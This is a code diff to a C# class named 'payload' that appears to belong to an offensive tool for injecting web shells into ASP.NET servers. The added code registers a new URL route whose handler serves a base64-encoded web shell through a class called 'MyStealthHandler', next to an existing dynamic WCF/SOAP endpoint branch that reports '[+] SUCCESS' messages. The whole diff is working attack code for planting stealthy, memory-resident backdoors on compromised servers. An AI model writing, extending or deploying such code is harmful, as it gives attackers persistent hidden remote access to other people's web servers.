@@ -1,6 +1,7 @@
 using System;
 using System.IO;
 using System.Web;
+using System.Web.Routing;
 using System.Web.Hosting;
 using System.Reflection;
 using System.Collections;
@@ -94,6 +95,14 @@ public class payload
                 fnGlobalClearCache();
 
                 return $"[+] SUCCESS: WCF/SOAP Dynamic Endpoint successfully allocated at [{szUrlPattern}]!";
+            }
+            else if (shellType.Equals("route", StringComparison.OrdinalIgnoreCase))
+            {
+                var routeHandler = new MyRouteHandler(Encoding.UTF8.GetBytes(szWebShellBase64));
+                lock (RouteTable.Routes)
+                {
+                    RouteTable.Routes.Add(new Route(szUrlPattern.TrimStart('/'), routeHandler));
+                }
             }
         }
         catch (Exception ex)
@@ -261,6 +270,21 @@ public class payload
                     ctx.Response.Write("SOAP_DYNAMIC_EXEC_FAULT: " + ex.Message);
                 }
             }
+        }
+    }
+
+    public class MyRouteHandler : IRouteHandler
+    {
+        private byte[] _payloadBytes;
+
+        public MyRouteHandler(byte[] payloadBytes)
+        {
+            _payloadBytes = payloadBytes;
+        }
+
+        public IHttpHandler GetHttpHandler(RequestContext ctx)
+        {
+            return new MyStealthHandler(_payloadBytes);
         }
     }
 
